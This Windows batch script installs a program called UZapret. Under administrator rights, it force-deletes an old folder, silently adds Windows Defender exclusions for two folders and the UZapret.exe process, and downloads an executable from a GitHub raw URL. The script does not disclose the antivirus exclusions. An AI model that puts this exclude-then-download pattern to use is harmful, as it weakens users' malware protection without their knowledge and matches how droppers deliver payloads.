@echo off
net session >nul 2>&1 || (echo Run as administrator! & pause & exit /b)

set "DOCS=%USERPROFILE%\Documents\UZapret"
set "DESKTOP=%USERPROFILE%\Desktop\UZapret"


:: Проверяем и удаляем папку в документах если она существует
if exist "%DOCS%" (
    echo Found existing UZapret folder in Documents. Deleting...
    takeown /f "%DOCS%" /r /d y >nul 2>&1
    icacls "%DOCS%" /grant "%USERNAME%":F /t >nul 2>&1
    rmdir /s /q "%DOCS%" 2>nul
    if exist "%DOCS%" (
        echo Failed to delete, trying force delete...
        del /f /q "%DOCS%\*" 2>nul
        rmdir /s /q "%DOCS%" 2>nul
    )
    echo Old folder removed.
)



mkdir "%DESKTOP%" 2>nul

powershell -Command "Add-MpPreference -ExclusionPath '%DOCS%'"
powershell -Command "Add-MpPreference -ExclusionPath '%DESKTOP%'"
powershell -Command "Add-MpPreference -ExclusionProcess 'UZapret.exe'"

echo Downloading...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Sasha5685/UZapret/main/UZapret.exe' -OutFile '%DESKTOP%\UZapret.exe'"

echo Done! File in UZapretInstaller folder on desktop.
echo.
echo Note: The folder in Documents will be created automatically
echo when you first run the program.
pause